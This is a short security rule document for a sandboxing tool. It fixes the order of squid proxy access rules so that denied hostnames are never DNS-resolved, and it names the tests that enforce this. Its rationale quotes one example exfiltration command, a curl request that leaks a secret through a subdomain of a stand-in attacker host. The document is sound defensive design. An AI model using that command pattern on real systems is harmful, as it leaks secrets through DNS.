---
id: EGR-03
title: "Refused names are never resolved"
area: egress
security: SEC-05
applies-to:
  - "nixenv.sh"
enforced-by:
  - tests/unit/08-egress-config.sh
  - tests/integration/07-restricted-egress.sh
---

# EGR-03: Refused names are never resolved

## Rule

- The generated squid `http_access` order MUST be: `deny !nixenv_projects`
  (src) → `deny CONNECT !Connect_ports` → port-22 gates → per-project name gate
  `deny p_X !d_X` → `deny to_localnets` (the ONLY `dst` ACL) → allows →
  `deny all`.
- Names and IPs share ONE `dstdomain -n` list per project; there is no
  per-project `dst` ACL.
- CONNECT is limited to ports 443/22/80/9418; `to_localnets` denies loopback,
  RFC1918, link-local (incl. 169.254.169.254) and IPv6 equivalents.

## Why

squid stops at the first matching rule and a `dst` ACL resolves the hostname.
The old order (`deny to_localnets` first) looked up EVERY requested name, so
`curl -x proxy http://<secret>.attacker.example/` leaked data through DNS
despite `TCP_DENIED`. `-n` stops the reverse lookup of IP-literal URLs; an
allowed IP matches requests addressed to it literally, not names resolving to
it.

## How

`tests/squid_acl_sim.py` models squid's evaluation and reports whether a lookup
would happen; integration runs `squid -k parse` on the real config.
